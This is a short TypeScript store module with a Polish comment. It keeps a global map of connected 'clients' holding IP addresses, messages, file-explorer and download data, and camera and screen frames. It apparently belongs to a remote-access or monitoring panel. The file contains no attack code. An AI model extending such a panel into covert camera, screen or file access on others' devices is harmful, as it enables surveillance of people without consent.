// lib/store.ts
// Hack aby globalny stan przetrwał przeładowania w trakcie dewelopmentu
const globalForStore = global as unknown as {
  clients: Map<string, { 
    id: string, 
    ip: string, 
    lastSeen: number, 
    messages: string[], 
    explorerData: any, 
    downloadData: any, 
    cameraData: string | null, 
    cameraUpdatedAt: number,
    isCameraActive: boolean,
    screenData: string | null,
    screenUpdatedAt: number,
    isScreenActive: boolean
  }>,
  ipList: string
};

if (!globalForStore.clients) {
  globalForStore.clients = new Map();
}
if (globalForStore.ipList === undefined) {
  globalForStore.ipList = "";
}

export const clients = globalForStore.clients;
export const getIpStore = () => globalForStore.ipList;
export const setIpStore = (val: string) => { globalForStore.ipList = val; };
